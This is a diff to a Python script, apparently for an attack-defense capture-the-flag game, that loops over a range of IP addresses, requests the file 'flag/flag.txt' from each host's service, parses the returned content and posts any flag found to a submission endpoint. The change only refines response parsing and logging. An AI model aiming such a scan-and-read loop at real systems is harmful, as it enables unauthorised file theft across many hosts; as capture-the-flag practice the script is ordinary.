@@ -17,17 +17,20 @@ for i in range(ip_start, ip_end + 1):
     url = f"{base_url}{i}{port}"
     try:
         # Attempt to upload a file with the name of the flag
-        upload_response = requests.post(url, params={"filename": "flag/flag.txt"}, timeout=5)  # Adding timeout
+        upload_response = requests.post(url, params={"filename": "flag/flag.txt"}, timeout=5)
         
         # Print the URL and the response from the server
         print(f"URL: {url}")
-        print("Response:", upload_response.text)
+        print("Raw Response:", upload_response.text)
         print("-" * 50)
         
-        # Assuming the response contains a flag, send it to the submission endpoint
-        if "flag" in upload_response.text.lower():  # Check if the response contains the word "flag"
-            flag = upload_response.text.strip()  # Extract the flag (may need adjustment based on actual response format)
-            data = {"flags": [flag]}
+        # Parse the JSON response to extract the flag content
+        response_json = upload_response.json()  # Convert response to JSON
+        flag_content = response_json.get("content", "").strip()  # Extract only the flag content
+
+        if flag_content:
+            print(f"Flag found: {flag_content}")
+            data = {"flags": [flag_content]}  # Use only the flag content
             
             # Send the flag to the submission endpoint
             submission_response = requests.post(
@@ -42,6 +45,9 @@ for i in range(ip_start, ip_end + 1):
             # Print the response from the flag submission
             print(f"Flag submitted from {url}")
             print("Submission Response:", submission_response.text)
+            print("-" * 50)
+        else:
+            print(f"No flag found in response from {url}")
             print("-" * 50)
         
     except requests.exceptions.RequestException as e:
